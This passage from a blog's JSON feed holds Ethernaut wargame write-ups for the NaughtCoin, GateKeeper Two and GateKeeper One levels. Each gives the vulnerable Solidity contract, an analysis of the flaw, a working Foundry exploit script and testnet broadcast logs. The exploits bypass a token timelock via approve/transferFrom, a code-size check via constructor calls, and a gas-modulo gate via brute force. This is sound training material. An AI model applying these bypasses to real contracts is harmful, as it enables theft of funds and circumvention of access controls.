class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">ex</span><span class=\"p\">(</span><span class=\"n\">NaughtCoin</span> <span class=\"n\">nc_</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">_player</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">_token</span><span class=\"p\">)</span> <span class=\"k\">external</span><span class=\"p\">{</span>        <span class=\"n\">nc_</span><span class=\"p\">.</span><span class=\"n\">transferFrom</span><span class=\"p\">(</span><span class=\"n\">_player</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">),</span> <span class=\"n\">_token</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">NaughtCoinSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">NaughtCoin</span> <span class=\"k\">public</span> <span class=\"n\">nc_</span> <span class=\"o\">=</span> <span class=\"n\">NaughtCoin</span><span class=\"p\">(</span><span class=\"mh\">0x6bF577FBb92fcE9F1480EbBeD1aC0403b21025b2</span><span class=\"p\">);</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">token</span> <span class=\"o\">=</span> <span class=\"n\">nc_</span><span class=\"p\">.</span><span class=\"n\">INITIAL_SUPPLY</span><span class=\"p\">();</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Balances: \"</span><span class=\"p\">,</span> <span class=\"n\">nc_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envAddress</span><span class=\"p\">(</span><span class=\"s\">\"MY_ADDRESS\"</span><span class=\"p\">)));</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">();</span>        <span class=\"n\">nc_</span><span class=\"p\">.</span><span class=\"n\">approve</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">ex</span><span class=\"p\">),</span> <span class=\"n\">token</span><span class=\"p\">);</span>        <span class=\"n\">ex</span><span class=\"p\">.</span><span class=\"n\">ex</span><span class=\"p\">(</span><span class=\"n\">nc_</span><span class=\"p\">,</span> <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envAddress</span><span class=\"p\">(</span><span class=\"s\">\"MY_ADDRESS\"</span><span class=\"p\">),</span> <span class=\"n\">token</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Balances: \"</span><span class=\"p\">,</span> <span class=\"n\">nc_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envAddress</span><span class=\"p\">(</span><span class=\"s\">\"MY_ADDRESS\"</span><span class=\"p\">)));</span>                <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>The <code class=\"language-plaintext highlighter-rouge\">transferFrom</code> function can retrieve tokens up to the approved amount if approval was previously granted through the <code class=\"language-plaintext highlighter-rouge\">approve</code> function.</p><p>After creating the <code class=\"language-plaintext highlighter-rouge\">Ex</code> contract and granting approval, tokens can be retrieved from the <code class=\"language-plaintext highlighter-rouge\">Ex</code> contract using the <code class=\"language-plaintext highlighter-rouge\">transferFrom</code> function without the <code class=\"language-plaintext highlighter-rouge\">timeLock</code> restriction.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/NaughtCoinSol.sol:NaughtCoinSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>⠒] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Balances:  1000000000000000000000000  Balances:  0<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001008466 gweiEstimated total gas used <span class=\"k\">for </span>script: 410540Estimated amount required: 0.00000041401563164 ETH<span class=\"o\">==========================</span>⠂ Sequence <span class=\"c\">#1 on holesky | Waiting for pending transactions</span>    ⠠ <span class=\"o\">[</span>Pending] 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3    ⡀ <span class=\"o\">[</span>Pending] 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749⢀ Sequence <span class=\"c\">#1 on holesky | Waiting for pending transactions</span>    ⡀ <span class=\"o\">[</span>Pending] 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3    ⠄ <span class=\"o\">[</span>Pending] 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749⠁ Sequence <span class=\"c\">#1 on holesky | Waiting for pending transactions</span>    ⠂ <span class=\"o\">[</span>Pending] 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3    ⠐ <span class=\"o\">[</span>Pending] 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749⠁ Sequence <span class=\"c\">#1 on holesky | Waiting for pending transactions</span>    ⠁ <span class=\"o\">[</span>Pending] 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3    ⠠ <span class=\"o\">[</span>Pending] 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749<span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3Contract Address: 0x5027B78a821BB27bd371F0699bC6CDC12778C34eBlock: 3767317Paid: 0.000000210921904108 ETH <span class=\"o\">(</span>209156 gas <span class=\"k\">*</span> 0.001008443 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0x393caf180b8749d4deac62bc9e0c2905ec4ee8cf3f243272f2c115cccf935125Block: 3767317Paid: 0.000000054534580554 ETH <span class=\"o\">(</span>54078 gas <span class=\"k\">*</span> 0.001008443 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749Block: 3767317Paid: 0.000000046685868685 ETH <span class=\"o\">(</span>46295 gas <span class=\"k\">*</span> 0.001008443 gwei<span class=\"o\">)</span>✅ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000312142353347 ETH (309529 gas * avg 0.001008443 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div>",
            "url": "https://0o3q.github.io/2025/05/01/naughtcoin",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","ERC20"],
            
            "date_published": "2025-05-01T00:00:00+09:00",
            "date_modified": "2025-05-01T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/28/gatekeepertwo",
            "title": "[Ethernaut] 14.GateKeeper Two",
            "summary": null,
            "content_text": "AnalysisThe goal is  Register as an entrant to pass this level.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract GatekeeperTwo {    address public entrant;    modifier gateOne() {        require(msg.sender != tx.origin);        _;    }    modifier gateTwo() {        uint256 x;        assembly {            x := extcodesize(caller())        }        require(x == 0);        _;    }    modifier gateThree(bytes8 _gateKey) {        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);        _;    }    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {        entrant = tx.origin;        return true;    }}assembly keyword allows a contract to access functionality that is not native to vanilla Solidity.extcodesize call will get the size of a contract’s code at a given address.If the size of a contract’s code at a given address is zero, it indicates that the address is EOAHowever, this seems to conflict with gateOne() modifierIn section 7 of yellow paper, I found sentence:  “During initialization code execution, EXTCODESIZE on the address should return zero”I also found the concept “initialization code excution” in here.  💡 When a contract is created, its constructor (a function declared with the constructor keyword) is executed once.Solving the gateThree() modifier is straightforward if you use the properties of XOR:given uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max , derive uint64(_gateKey)  by computing uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).maxExploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/GateKeeperTwo.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    constructor(GatekeeperTwo gkt_) {        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);        gkt_.enter(gateKey);    }}contract GateKeeperTwoSol is Script {    GatekeeperTwo public gkt_ = GatekeeperTwo(0x1376d3d0070BE56e26c6F566EeC4fd975bD1aC63);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));            console.log(\"Before entrant: \", gkt_.entrant());        Ex ex = new Ex(gkt_);        console.log(\"After entrant: \", gkt_.entrant());        vm.stopBroadcast();    }}$ forge script script/GateKeeperTwoSol.sol:GateKeeperTwoSol --broadcast[⠊] Compiling...[⠒] Compiling 26 files with Solc 0.8.29[⠆] Compiling 4 files with Solc 0.6.12[⠑] Solc 0.6.12 finished in 42.16ms[⠘] Solc 0.8.29 finished in 335.40msCompiler run successful with warnings:Warning (2072): Unused local variable.  --&gt; script/GateKeeperTwoSol.sol:22:9:   |22 |         Ex ex = new Ex(gkt_);   |         ^^^^^Script ran successfully.== Logs ==  Before entrant:  0x0000000000000000000000000000000000000000  After entrant:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.00107283 gweiEstimated total gas used for script: 135274Estimated amount required: 0.00000014512600542 ETH==========================##### holesky✅  [Success] Hash: 0xe75e5f11118632a6eab29c325a0fdaa1891b6b082a341d628eb26f3b155cc2a1Contract Address: 0x4D05500E91144D2F8aa3A2E54050659eC22bD6c2Block: 3750329Paid: 0.000000111634638854 ETH (104057 gas * 0.001072822 gwei)✅ Sequence #1 on holesky | Total Paid: 0.000000111634638854 ETH (104057 gas * avg 0.001072822 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Register as an entrant to pass this level.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">GatekeeperTwo</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">entrant</span><span class=\"p\">;</span>    <span class=\"k\">modifier</span> <span class=\"n\">gateOne</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">!=</span> <span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">gateTwo</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"kt\">uint256</span> <span class=\"n\">x</span><span class=\"p\">;</span>        <span class=\"k\">assembly</span> <span class=\"p\">{</span>            <span class=\"n\">x</span> <span class=\"o\">:=</span> <span class=\"n\">extcodesize</span><span class=\"p\">(</span><span class=\"n\">caller</span><span class=\"p\">())</span>        <span class=\"p\">}</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">x</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">gateThree</span><span class=\"p\">(</span><span class=\"kt\">bytes8</span> <span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"kt\">bytes8</span><span class=\"p\">(</span><span class=\"nb\">keccak256</span><span class=\"p\">(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodePacked</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">))))</span> <span class=\"o\">^</span> <span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"o\">==</span> <span class=\"k\">type</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">).</span><span class=\"n\">max</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">enter</span><span class=\"p\">(</span><span class=\"kt\">bytes8</span> <span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">gateOne</span> <span class=\"n\">gateTwo</span> <span class=\"n\">gateThree</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">entrant</span> <span class=\"o\">=</span> <span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span><span class=\"p\">;</span>        <span class=\"k\">return</span> <span class=\"nb\">true</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><code class=\"language-plaintext highlighter-rouge\">assembly</code> keyword allows a contract to access functionality that is not native to vanilla Solidity.</p><p><code class=\"language-plaintext highlighter-rouge\">extcodesize</code> call will get the size of a contract’s code at a given address.</p><p>If the size of a contract’s code at a given address is zero, it indicates that the address is EOA</p><p>However, this seems to conflict with <code class=\"language-plaintext highlighter-rouge\">gateOne()</code> modifier</p><p>In section 7 of <a href=\"https://ethereum.github.io/yellowpaper/paper.pdf\">yellow paper</a>, I found sentence:</p><blockquote>  <p>“During initialization code execution, EXTCODESIZE on the address should return zero”</p></blockquote><p>I also found the concept “initialization code excution” in <a href=\"https://docs.soliditylang.org/en/latest/contracts.html#creating-contracts\">here</a>.</p><blockquote>  <p>💡 When a contract is <strong>created</strong>, its <a href=\"https://docs.soliditylang.org/en/latest/contracts.html#constructor\">constructor</a> (a function declared with the <code class=\"language-plaintext highlighter-rouge\">constructor</code> keyword) is executed once.</p></blockquote><p>Solving the <code class=\"language-plaintext highlighter-rouge\">gateThree()</code> modifier is straightforward if you use the properties of XOR:</p><p>given <code class=\"language-plaintext highlighter-rouge\">uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max</code> , derive <code class=\"language-plaintext highlighter-rouge\">uint64(_gateKey)</code>  by computing <code class=\"language-plaintext highlighter-rouge\">uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max</code></p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/GateKeeperTwo.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"n\">GatekeeperTwo</span> <span class=\"n\">gkt_</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"kt\">bytes8</span> <span class=\"n\">gateKey</span> <span class=\"o\">=</span> <span class=\"kt\">bytes8</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"kt\">bytes8</span><span class=\"p\">(</span><span class=\"nb\">keccak256</span><span class=\"p\">(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodePacked</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">)))))</span> <span class=\"o\">^</span> <span class=\"k\">type</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">).</span><span class=\"n\">max</span><span class=\"p\">);</span>        <span class=\"n\">gkt_</span><span class=\"p\">.</span><span class=\"n\">enter</span><span class=\"p\">(</span><span class=\"n\">gateKey</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">GateKeeperTwoSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">GatekeeperTwo</span> <span class=\"k\">public</span> <span class=\"n\">gkt_</span> <span class=\"o\">=</span> <span class=\"n\">GatekeeperTwo</span><span class=\"p\">(</span><span class=\"mh\">0x1376d3d0070BE56e26c6F566EeC4fd975bD1aC63</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>            <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before entrant: \"</span><span class=\"p\">,</span> <span class=\"n\">gkt_</span><span class=\"p\">.</span><span class=\"n\">entrant</span><span class=\"p\">());</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">(</span><span class=\"n\">gkt_</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After entrant: \"</span><span class=\"p\">,</span> <span class=\"n\">gkt_</span><span class=\"p\">.</span><span class=\"n\">entrant</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/GateKeeperTwoSol.sol:GateKeeperTwoSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>⠊] Compiling...<span class=\"o\">[</span>⠒] Compiling 26 files with Solc 0.8.29<span class=\"o\">[</span>⠆] Compiling 4 files with Solc 0.6.12<span class=\"o\">[</span>⠑] Solc 0.6.12 finished <span class=\"k\">in </span>42.16ms<span class=\"o\">[</span>⠘] Solc 0.8.29 finished <span class=\"k\">in </span>335.40msCompiler run successful with warnings:Warning <span class=\"o\">(</span>2072<span class=\"o\">)</span>: Unused <span class=\"nb\">local </span>variable.  <span class=\"nt\">--</span><span class=\"o\">&gt;</span> script/GateKeeperTwoSol.sol:22:9:   |22 |         Ex ex <span class=\"o\">=</span> new Ex<span class=\"o\">(</span>gkt_<span class=\"o\">)</span><span class=\"p\">;</span>   |         ^^^^^Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Before entrant:  0x0000000000000000000000000000000000000000  After entrant:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.00107283 gweiEstimated total gas used <span class=\"k\">for </span>script: 135274Estimated amount required: 0.00000014512600542 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0xe75e5f11118632a6eab29c325a0fdaa1891b6b082a341d628eb26f3b155cc2a1Contract Address: 0x4D05500E91144D2F8aa3A2E54050659eC22bD6c2Block: 3750329Paid: 0.000000111634638854 ETH <span class=\"o\">(</span>104057 gas <span class=\"k\">*</span> 0.001072822 gwei<span class=\"o\">)</span>✅ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000111634638854 ETH (104057 gas * avg 0.001072822 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-28-GateKeeperTwo/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/28/gatekeepertwo",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","assembly","extcodesize","XOR"],
            
            "date_published": "2025-04-28T00:00:00+09:00",
            "date_modified": "2025-04-28T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/22/gatekeeper-one",
            "title": "[Ethernaut] 13.GateKeeper One",
            "summary": null,
            "content_text": "AnalysisThe goal is  Make it past the gatekeeper and register as an entrant to pass this level.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract GatekeeperOne {    address public entrant;    modifier gateOne() {        require(msg.sender != tx.origin);        _;    }    modifier gateTwo() {        require(gasleft() % 8191 == 0);        _;    }    modifier gateThree(bytes8 _gateKey) {        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");        require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");        _;    }    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {        entrant = tx.origin;        return true;    }}Solidity 0.8.30 Documentation - units and global variables  💡 gasleft() returns (uint256): remaining gasSolidity 0.8.30 Documentation - external function calls  💡 When calling functions of other contracts, you can specify the amount of Wei or gas sent with the call with the special options {value: 10, gas: 10000}. Note that it is discouraged to specify gas values explicitly, since the gas costs of opcodes can change in the future.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/GateKeeperOne.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    function ex(GatekeeperOne gko_) external returns (uint){        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) &amp; 0xFFFFFFFF0000FFFF;        for(uint i=0; i&lt;=350; i++) {            (bool result,) = address(gko_).call{gas: i+(8191*3)}(abi.encodeWithSignature(\"enter(bytes8)\", gateKey));            if(result) {                return i;            }        }    }}contract GateKeeperOneSol is Script {    GatekeeperOne public gko_ = GatekeeperOne(0x8905857EFf6E619C391C6a828B62F86f2D15CCf8);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));            console.log(\"Before entrant: \", gko_.entrant());        Ex ex = new Ex();        console.log(\"gas: \", ex.ex(gko_));        console.log(\"After entrant: \", gko_.entrant());        vm.stopBroadcast();    }}$ forge script script/GateKeeperOneSol.sol --tc GateKeeperOneSol --broadcast[⠊] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Before entrant:  0x0000000000000000000000000000000000000000  gas:  256  After entrant:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001016731 gweiEstimated total gas used for script: 987058Estimated amount required: 0.000001003572467398 ETH==========================##### holesky✅  [Success] Hash: 0x4a586d22227da1b4e2ea917dace32511f929924c727de6b803583281190d3fc7Block: 3700680Paid: 0.000000434849804628 ETH (427697 gas * 0.001016724 gwei)##### holesky✅  [Success] Hash: 0xfb2ec0646fe566660746a9b0d4bee577abc05e255f4e08aec3dfd7368faaf944Contract Address: 0xBD597a280DC80c5f4D76A6Ccf23FAA6b00f721e3Block: 3700680Paid: 0.000000282768228708 ETH (278117 gas * 0.001016724 gwei)✅ Sequence #1 on holesky | Total Paid: 0.000000717618033336 ETH (705814 gas * avg 0.001016724 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Make it past the gatekeeper and register as an entrant to pass this level.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">GatekeeperOne</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">entrant</span><span class=\"p\">;</span>    <span class=\"k\">modifier</span> <span class=\"n\">gateOne</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">!=</span> <span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">gateTwo</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"nb\">gasleft</span><span class=\"p\">()</span> <span class=\"o\">%</span> <span class=\"mi\">8191</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">gateThree</span><span class=\"p\">(</span><span class=\"kt\">bytes8</span> <span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"kt\">uint32</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">))</span> <span class=\"o\">==</span> <span class=\"kt\">uint16</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">)),</span> <span class=\"s\">\"GatekeeperOne: invalid gateThree part one\"</span><span class=\"p\">);</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"kt\">uint32</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">))</span> <span class=\"o\">!=</span> <span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">),</span> <span class=\"s\">\"GatekeeperOne: invalid gateThree part two\"</span><span class=\"p\">);</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"kt\">uint32</span><span class=\"p\">(</span><span class=\"kt\">uint64</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">))</span> <span class=\"o\">==</span> <span class=\"kt\">uint16</span><span class=\"p\">(</span><span class=\"kt\">uint160</span><span class=\"p\">(</span><span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span><span class=\"p\">)),</span> <span class=\"s\">\"GatekeeperOne: invalid gateThree part three\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">enter</span><span class=\"p\">(</span><span class=\"kt\">bytes8</span> <span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">gateOne</span> <span class=\"n\">gateTwo</span> <span class=\"n\">gateThree</span><span class=\"p\">(</span><span class=\"n\">_gateKey</span><span class=\"p\">)</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">entrant</span> <span class=\"o\">=</span> <span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span><span class=\"p\">;</span>        <span class=\"k\">return</span> <span 